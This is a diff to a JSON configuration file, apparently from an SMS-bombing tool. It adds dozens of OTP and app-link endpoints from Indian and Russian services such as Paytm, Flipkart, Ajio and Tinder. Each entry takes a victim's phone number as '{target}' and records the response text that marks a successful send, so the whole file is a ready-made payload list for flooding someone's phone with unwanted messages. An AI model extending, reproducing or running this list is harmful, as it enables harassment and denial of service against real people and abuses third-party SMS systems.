@@ -2,6 +2,45 @@
     "sms": {
         "91": [
             {
+                "name": "confirmtkt",
+                "method": "GET",
+                "url": "https://securedapi.confirmtkt.com/api/platform/register",
+                "params": {
+                    "newOtp": "true",
+                    "mobileNumber": "{target}"
+                },
+                "identifier": "false"
+            },
+            {
+                "name": "justdial",
+                "method": "GET",
+                "url": "https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php",
+                "params": {
+                    "mobile": "{target}"
+                },
+                "identifier": "sent"
+            },
+            {
+                "name": "frotels",
+                "method": "POST",
+                "url": "https://www.frotels.com/appsendsms.php",
+                "data": {
+                    "mobno": "{target}"
+                },
+                "identifier": "sent"
+            },
+            {
+                "name": "gapoon",
+                "method": "POST",
+                "url": "https://www.gapoon.com/userSignup",
+                "data": {
+                    "mobile": "{target}",
+                    "email": "SpeedX@gmail.com",
+                    "name": "SpeedX"
+                },
+                "identifier": "1"
+            },
+            {
                 "name": "housing",
                 "method": "POST",
                 "url": "https://login.housing.com/api/v2/send-otp",
@@ -11,11 +50,54 @@
                 "identifier": "Sent"
             },
             {
+                "name": "porter",
+                "method": "POST",
+                "url": "https://porter.in/restservice/send_app_link_sms",
+                "data": {
+                    "phone": "{target}",
+                    "referrer_string": "",
+                    "brand": "porter"
+                },
+                "identifier": "true"
+            },
+            {
+                "name": "cityflo",
+                "method": "POST",
+                "url": "https://cityflo.com/website-app-download-link-sms/",
+                "data": {
+                    "mobile_number": "{target}"
+                },
+                "identifier": "sent"
+            },
+            {
                 "name": "nnnow",
                 "method": "POST",
                 "url": "https://api.nnnow.com/d/api/appDownloadLink",
                 "data": {
                     "mobileNumber": "{target}"
+                },
+                "identifier": "true"
+            },
+            {
+                "name": "ajio",
+                "method": "POST",
+                "url": "https://login.web.ajio.com/api/auth/signupSendOTP",
+                "data": {
+                    "firstName": "xxps",
+                    "login": "wiqpdl223@wqew.com",
+                    "password": "QASpw@1s",
+                    "genderType": "Male",
+                    "mobileNumber": "{target}",
+                    "requestType": "SENDOTP"
+                },
+                "identifier": "1"
+            },
+            {
+                "name": "happyeasygo",
+                "method": "GET",
+                "url": "https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do",
+                "params": {
+                    "phone": "91%20{target}"
                 },
                 "identifier": "true"
             },
@@ -38,13 +120,44 @@
                 "identifier": "sent"
             },
             {
+                "name": "mobikwik",
+                "method": "POST",
+                "url": "https://webapi.mobikwik.com/p/account/otp/cell/v2",
+                "data": {
+                    "cell": "{target}"
+                },
+                "headers": {
+                    "X-MClient": "0"
+                },
+                "identifier": "true"
+            },
+            {
+                "name": "airtel",
+                "method": "GET",
+                "url": "https://www.airtel.in/referral-api/core/notify",
+                "params": {
+                    "messageId": "map",
+                    "rtn": "{target}"
+                },
+                "identifier": "Success"
+            },
+            {
+                "name": "pharmeasy",
+                "method": "POST",
+                "url": "https://pharmeasy.in/api/auth/requestOTP",
+                "json": {
+                    "contactNumber": "{target}"
+                },
+                "identifier": "resendSmsCounter"
+            },
+            {
                 "name": "mylescars",
                 "method": "POST",
                 "url": "https://www.mylescars.com/usermanagements/chkContact",
                 "data": {
                     "contactNo": "{target}"
                 },
-                "identifier": "success@"
+                "identifier": "success@::::"
             },
             {
                 "name": "grofers",
@@ -70,6 +183,25 @@
                 "identifier": "true"
             },
             {
+                "name": "cashify",
+                "method": "GET",
+                "url": "https://www.cashify.in/api/cu01/v1/app-link",
+                "params": {
+                    "mn": "{target}"
+                },
+                "identifier": "Successfully"
+            },
+            {
+                "name": "paytm",
+                "method": "POST",
+                "url": "https://commonfront.paytm.com/v4/api/sendsms",
+                "data": {
+                    "phone": "{target}",
+                    "guid": "2952fa812660c58dc160ca6c9894221d"
+                },
+                "identifier": "202"
+            },
+            {
                 "name": "kfc-in",
                 "method": "POST",
                 "url": "https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin",
@@ -82,7 +214,58 @@
                     "phoneNumber": "{target}",
                     "Resend": "false"
                 },
-                "identifier": "True"
+                "identifier": "true"
+            },
+            
+            {
+                "name": "flipkart",
+                "method": "POST",
+                "cc_target": "loginId",
+                "url": "https://www.flipkart.com/api/5/user/otp/generate",
+                "data": {
+                    "loginId": "+{target}"
+                },
+                "headers": {
+                    "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
+                    "Origin": "https://www.flipkart.com",
+                    "Content-Type": "application/x-www-form-urlencoded"
+                },
+                "identifier": "emailMask"
+            },
+            {
+                "name": "qlean",
+                "method": "POST",
+                "url": "https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",
+                "data": {
+                    "phone": "{cc}{target}"
+                },
+                "identifier": "request_id"
+            },
+            {
+                "name": "mailru",
+                "method": "POST",
+                "url": "https://cloud.mail.ru//api/v2/notify/applink",
+                "data": {
+                    "phone": "+{cc}{target}",
+                    "api": "2",
+                    "email": "email",
+                    "x-email": "x-email"
+                },
+                "identifier": "200"
+            },
+            {
+                "name": "tinder",
+                "method": "POST",
+                "url": "https://api.gotinder.com/v2/auth/sms/send",
+                "params": {
+                    
+                },
+                "data": {
+                    "phone_number": "{cc}{target}",
+                    "auth_type": "sms",
+                    "locale": "ru"
+                },
+                "identifier": "200"
             },
             {
                 "name": "youla",
@@ -92,6 +275,25 @@
                     "phone": "+{cc}{target}"
                 },
                 "identifier": ":6"
+            },
+            {
+                "name": "ivi",
+                "method": "POST",
+                "url": "https://api.ivi.ru/mobileapi/user/register/phone/v6",
+                "data": {
+                    "phone": "{cc}{target}"
+                },
+                "identifier": "true"
+            },
+            {
+                "name": "delitime",
+                "method": "POST",
+                "url": "https://api.delitime.ru/api/v2/signup",
+                "data": {
+                    "SignupForm[username]": "{cc}{target}",
+                    "SignupForm[device_type]": "3"
+                },
+                "identifier": "true"
             },
             {
                 "name": "icq",
@@ -115,6 +317,17 @@
                     "app_version": "870"
                 },
                 "identifier": "true"
+            },
+            {
+                "name": "redbus",
+                "method": "GET",
+                "url": "https://m.redbus.in/api/getOtp",
+                "data": {
+                    "number": "{target}",
+                    "cc": "{cc}",
+                    "whatsAppOpted": false
+                },
+                "identifier": "200"
             }
         ]
     },
